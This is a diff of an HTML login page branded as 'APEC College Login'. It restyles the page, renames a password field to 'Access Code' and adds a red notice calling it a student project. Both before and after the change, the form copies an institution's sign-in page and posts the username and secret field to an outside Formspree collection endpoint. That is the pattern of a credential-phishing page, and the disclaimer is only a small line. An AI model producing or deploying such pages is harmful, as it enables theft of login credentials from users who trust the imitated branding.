@@ -22,8 +22,8 @@ body{
 }
 
 .container{
-    width:350px;
-    background:white;
+    width:360px;
+    background:#fff;
     padding:30px;
     border-radius:10px;
     box-shadow:0 0 15px rgba(0,0,0,0.2);
@@ -32,18 +32,23 @@ body{
 
 .logo{
     width:100px;
-    height:100px;
-    margin-bottom:15px;
+    margin-bottom:10px;
 }
 
 h2{
     color:#003366;
-    margin-bottom:20px;
+    margin-bottom:15px;
+}
+
+.notice{
+    color:red;
+    font-size:13px;
+    margin-bottom:15px;
 }
 
 input{
     width:100%;
-    padding:10px;
+    padding:12px;
     margin:10px 0;
     border:1px solid #ccc;
     border-radius:5px;
@@ -52,7 +57,7 @@ input{
 
 button{
     width:100%;
-    padding:10px;
+    padding:12px;
     background:#003366;
     color:white;
     border:none;
@@ -71,27 +76,31 @@ button:hover{
 
 <div class="container">
 
-    <img src="images" alt="APEC College Logo" class="logo">
+<img src="images.png" class="logo" alt="APEC College Logo">
 
-    <h2>APEC College Login</h2>
+<h2>APEC College Login</h2>
 
-    <form action="https://formspree.io/f/xbdvwjnr" method="POST">
+<p style="color:red;font-size:14px;">
+This is a student project for learning HTML and Formspree.
+Do not enter your real username or password.
+</p>
+<form action="https://formspree.io/f/xbdvwjnr" method="POST">
 
-        <input
-            type="text"
-            name="Username"
-            placeholder="Enter Username"
-            required>
+<input
+type="text"
+name="Username"
+placeholder="Enter Username"
+required>
 
-        <input
-            type="text"
-            name="Student Password Demo"
-            placeholder="Enter Password"
-            required>
+<input
+type="text"
+name="Access_Code"
+placeholder="Enter Access Code"
+required>
 
-        <button type="submit">Login</button>
+<button type="submit">Login</button>
 
-    </form>
+</form>
 
 </div>
 
